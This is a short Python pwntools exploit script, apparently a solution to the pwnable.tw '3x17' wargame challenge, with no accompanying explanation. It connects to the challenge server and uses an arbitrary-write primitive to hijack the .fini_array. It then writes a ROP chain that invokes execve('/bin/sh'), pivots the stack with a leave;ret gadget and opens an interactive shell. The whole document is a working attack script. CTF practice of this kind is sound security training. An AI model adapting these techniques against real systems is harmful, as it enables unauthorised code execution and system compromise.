from pwn import *


def sending(con, addr, data):
    con.recvuntil('addr:')
    con.sendline(str(addr))
    con.recvuntil('data:')
    con.send(data)


wmem  = 0x00401b6d
wmem_leave_ret = 0x00401c4b
ctl_f = 0x00402960
fini  = 0x004b40f0

pop_rax = 0x0041e4af
pop_rdx = 0x00446e35
syscall = 0x00471db5
pop_rsi = 0x00406c30
pop_rdi = 0x00401696
bin_sh  = 0x004b4080
shell_a = 0x004b4100

null = 0x0
execve = 0x3b


stack_adds = [pop_rax, execve, pop_rdx, null, pop_rsi, null, pop_rdi, bin_sh, syscall]
change_fini = p64(ctl_f) + p64(wmem)
w_bin_sh = "/bin/sh\x00"


#conn = process('./3x17')
conn = remote('chall.pwnable.tw', 10105)


# Change fini array
sending(conn, fini, change_fini)

# Injecting the stack
i = 0
for s_add in stack_adds:
    sending(conn, shell_a+i, p64(s_add))
    i += 8

# Injecting the string
sending(conn, bin_sh, w_bin_sh)

# Changing the rsp
sending(conn, fini, p64(wmem_leave_ret))


conn.interactive()
